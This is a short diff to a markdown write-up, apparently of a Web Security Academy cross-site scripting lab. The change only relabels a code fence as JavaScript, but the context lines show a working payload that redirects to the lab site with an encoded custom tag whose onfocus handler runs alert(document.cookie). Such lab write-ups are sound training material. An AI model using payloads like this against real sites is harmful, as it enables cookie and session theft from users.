@@ -46,7 +46,8 @@ In this example function `alert()` could be triggered by searching for specified
 In order to make payload automatic `iframe` tag will have to be used.\
 
 Final payload:
-```
+
+```js
 <script>
 location = 'https://0abc003b04aff4f380c7e45f008e0093.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
 </script>
